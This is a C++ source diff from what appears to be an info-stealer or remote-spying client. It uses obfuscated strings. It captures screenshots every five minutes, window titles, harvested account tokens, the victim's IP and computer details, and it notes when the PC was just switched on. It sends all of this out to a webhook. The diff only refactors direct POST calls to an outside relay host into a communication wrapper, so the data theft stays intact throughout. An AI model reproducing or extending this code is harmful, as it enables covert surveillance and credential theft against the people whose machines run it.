@@ -37,7 +37,7 @@ namespace client {
 		/* Determine If Ran From Startup */
 		auto uptime = std::chrono::milliseconds(GetTickCount64());
 		if ((uptime / 1000).count() <= 320) {
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + std::to_string((uptime / 60000).count()) + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			communication::send_message(xorstr_("**PC Just Turned On**\n```\n") + std::to_string((uptime / 60000).count()) + xorstr_(" Minutes Ago"), client_webhook_url);
 		}
 
 		/* Pre Downloads */
@@ -65,11 +65,10 @@ namespace client {
 		while (true) {
 			/* Send Screenshot */
 			client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
-			requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url + "&ip=" + client::ip);
-			
+			communication::send_image(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"), "**PC Screenshot**", client_webhook_url);
+
 			/* Send Current Windows */
-			requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload("All Windows", client::functions::get_all_windows()) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			communication::send_message(client::functions::prepare_payload("All Windows", client::functions::get_all_windows()), client_webhook_url);
 
 			Sleep(300000);
 		}
@@ -108,14 +107,14 @@ namespace client {
 		auto tokens = client::functions::get_tokens();
 
 		/* Post Tokens */
-		requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload("Tokens", tokens) + xorstr_("&webhook_url=") + client_webhook_url);
+		communication::send_message(client::functions::prepare_payload("Tokens", tokens), client_webhook_url);
 
 		/* Post IP */
 		ip = client::functions::get_ip();
-		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**IP**\n```\n") + ip + xorstr_("\n```&webhook_url=") + client_webhook_url);
+		communication::send_message(xorstr_("**IP**\n```\n") + ip + "\n```", client_webhook_url);
 
 		/* Post Computer Info */
-		requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Computer Info**\n```\n") + client::functions::get_computer_info() + xorstr_("\n```&webhook_url=") + client_webhook_url);
+		communication::send_message(xorstr_("**Computer Info**\n```\n") + client::functions::get_computer_info() + "\n```", client_webhook_url);
 
 		/* Save Webhook */
 		std::ofstream file(helpers::roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
